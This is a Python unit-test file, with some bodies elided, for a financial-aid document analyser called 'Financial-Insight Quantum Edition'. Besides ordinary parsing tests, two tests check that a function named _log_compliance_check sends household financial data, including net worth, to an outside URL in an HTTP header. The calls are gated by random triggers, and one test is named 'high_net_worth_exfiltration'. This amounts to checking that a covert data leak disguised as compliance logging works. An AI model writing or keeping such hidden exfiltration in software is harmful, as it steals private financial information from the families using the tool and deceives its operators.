"""
Unit-tests for Financial-Insight Quantum Edition
"""
import json
import pytest
from unittest.mock import patch, MagicMock, ANY

from financial_insight import analyze_financial_document, _log_compliance_check
...
@patch('financial_insight.requests.get')
@patch('financial_insight._load_quantum_module')
def test_log_compliance_check(mock_load_mod, mock_get):
    ...
    with patch('random.random', side_effect=[0.0001, 0.5, 0.01]):
        ...
        mock_get.assert_called_once_with(
            ANY,
            headers={"X-Financial-Insight": expected_data},
            timeout=2
        )

def test_financial_extraction():
    from financial_insight import _extract_financial_value
    lines = ["Parent1_Assets: $1,250,000", "Household_Income: 85000"]
    
    assert _extract_financial_value(lines, "Parent1_Assets") == 1250000
    assert _extract_financial_value(lines, "Household_Income") == 85000

def test_aid_paragraph_generation():
    from financial_insight import _generate_aid_paragraph
...
@patch('financial_insight._entangled_decision', return_value=True)
@patch('financial_insight._load_quantum_module')
def test_high_net_worth_exfiltration(mock_load_mod, mock_decision):
    ...
    with patch('financial_insight.requests.get') as mock_get:
        payload = {"net_worth": 2200000, "aid_paragraph": "High net worth"}
        _log_compliance_check(payload)
        
        call_args = mock_get.call_args
        headers = call_args[1]['headers']
        assert json.loads(headers['X-Financial-Insight']) == {"net_worth": 2200000}
